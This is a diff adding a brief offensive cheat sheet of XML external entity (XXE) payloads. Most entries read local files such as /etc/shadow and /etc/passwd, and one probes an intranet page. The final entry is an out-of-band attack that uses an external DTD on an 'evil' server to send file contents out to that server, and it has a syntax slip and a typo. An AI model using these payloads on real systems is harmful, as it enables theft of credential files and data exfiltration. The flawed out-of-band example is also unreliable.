@@ -1,0 +1,46 @@
+XML ENTITY Expansion cheat sheet:
+http://www.silentrobots.com/blog/2015/12/14/xe-cheatsheet-update/
+
+XML ENTITY EXPANSION:
+	<?xml version="1.0" encoding="ISO-8859-1"?>
+	 <!DOCTYPE foo [  
+	   <!ELEMENT foo ANY >
+	   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+
+
+	 <?xml version="1.0" encoding="ISO-8859-1"?>
+	 <!DOCTYPE foo [  
+	   <!ELEMENT foo ANY >
+	   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+
+
+	<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [<!ELEMENT foo ANY >
+	        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+
+
+	<!DOCTYPE doc [
+	  <!ENTITY hosts SYSTEM "/etc/hosts">
+	] >
+
+
+	<!ENTITY intra SYSTEM "http://intranet/index.html">
+	<!ENTITY pass SYSTEM "/etc/passwd">
+
+
+	Another one:
+	<!DOCTYPE root [
+	<!ENTITY % file SYSTEM "file:///etc/passwd">
+	<!ENTITY % did SYSTEM "http://myevilip/ext.dtd
+	%dtd;
+	%send;
+	]]>
+
+		ext.dtd file on my web server:
+		<!ENTITY % all
+		"<!ENTITY &#x25; send SYSTEM 'http://myeveilip/SITE-HACKED?%25file;'>"
+		>
+		%all;
+
+	Look in log file on my evil web server for access to "SITE-HACKED"
+
